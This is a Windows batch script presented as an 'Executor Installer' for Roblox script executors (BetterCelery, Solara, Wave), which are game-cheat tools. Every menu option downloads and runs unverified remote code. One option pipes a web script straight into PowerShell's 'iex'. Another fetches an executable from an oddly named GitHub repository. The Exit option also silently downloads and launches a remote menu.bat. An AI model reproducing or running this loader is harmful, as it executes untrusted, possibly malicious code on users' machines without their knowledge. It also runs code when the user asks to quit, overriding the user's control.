@echo off
title Executor Installer
goto Start
:Start
cls
echo Executor Installer
echo By dsc.gg/clipflip
echo.
echo.
echo [1] Open BetterCelery Installer
echo [2] Install Solara
echo [3] Install Wave
echo [4] Exit
echo.
choice /c 1234 /m "Enter your choice:"
if errorlevel 4 goto Exit
if errorlevel 3 goto Wave
if errorlevel 2 goto Solara
if errorlevel 1 goto BetterCelery

:BetterCelery
powershell -command "irm 'https://bcelery.github.io/a' | iex"
exit

:Solara
mkdir %localappdata%\Solara
powershell -command "Invoke-WebRequest -Uri 'https://github.com/furryman12/PUPPIES-AND-UNICORNS/raw/main/Bootstrapper.exe' -OutFile $env:LOCALAPPDATA\Solara\Bootstrapper.exe"
mklink %userprofile%\Desktop\Solara %userprofile%\AppData\Local\Solara\Bootstrapper.exe
goto Start

:Wave
mkdir %temp%\ExecutorInstaller
powershell -command "Invoke-WebRequest -Uri 'https://cdn.getwave.gg/WaveInstaller.exe' -OutFile $env:Temp\ExecutorInstaller\WaveInstaller.exe"
%temp%\ExecutorInstaller\WaveInstaller.exe
:Exit
rd /s /q %temp%\ExecutorInstaller
powershell -command "(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/clipflip-rblx/custom-installer/main/menu.bat\", \"menu.bat\"); Start-Process -FilePath menu.bat"
exit
